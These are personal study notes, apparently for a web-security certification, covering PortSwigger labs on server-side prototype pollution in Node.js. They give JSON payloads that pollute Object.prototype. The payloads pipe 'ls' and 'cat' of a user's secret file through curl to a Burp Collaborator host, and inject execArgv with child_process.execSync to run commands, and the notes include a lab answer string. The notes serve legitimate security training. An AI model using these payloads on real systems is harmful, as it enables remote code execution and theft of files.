## Stage 2 + 3

Server Side Prototype Pollution

### Identify Vulnerabilities in Exam
- JSON `POST` request like:
	- Update address

### Lab: Exfiltrating sensitive data via server-side prototype pollution 

1. Update address feature > use the payload below > click Raw > notice that the JSON has been indented meaning the prototype pollution worked.
```
"__proto__": {
    "json spaces":10
}
```

![SSPP-20260219210906626](SSPP-20260219210906626.png)

2. Use the payload below > Admin panel > Run maintenance jobs > poll burp collaborator to extract the contents of the `/home/carlos` directory encoded in base64. Notice there are node_apps and secret.
```
"__proto__": { "shell":"vim", "input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
}
```

![SSPP-20260219211226474](SSPP-20260219211226474.png)

3. Change the payload slightly to `cat /home/carlos/secret`. Repeat Step 2 to get the secret. Submit `5CCkFInaOSEzU5tkV9AWilJ0t3elmEbE` to solve.
```
"__proto__": { "shell":"vim", "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
}
```
![SSPP-20260219211551326](SSPP-20260219211551326.png)




---
Ignore this

Refers to [this lab](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution) in [Server side](Server%20side.md#3.9.%20Lab%20Remote%20code%20execution%20via%20server-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
But can leverage Prototype Pollution in Stage 3 to get the secret file.
Steps
1. Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.

> _**Identify**_ prototype pollution
```json
"__proto__": {
    "json spaces":10
}
```

> Test for remote code execution (RCE) by performing DNS request from back-end.
```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://OASTIFY.COM')"
    ]
}
```

Inject exploit in to read or delete user sensitive data. After injection, trigger new spawned node child processes, by using admin panel maintenance jobs button. This will action on Carlos `secret` file.
```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('cat /home/carlos/secret')"
    ]
}
```

>[!tip] How to Identify this Vulnerability?
>1. App using Node.js + Express framework(?)
>2. Identify prototype pollution with `"json spaces":10` or something



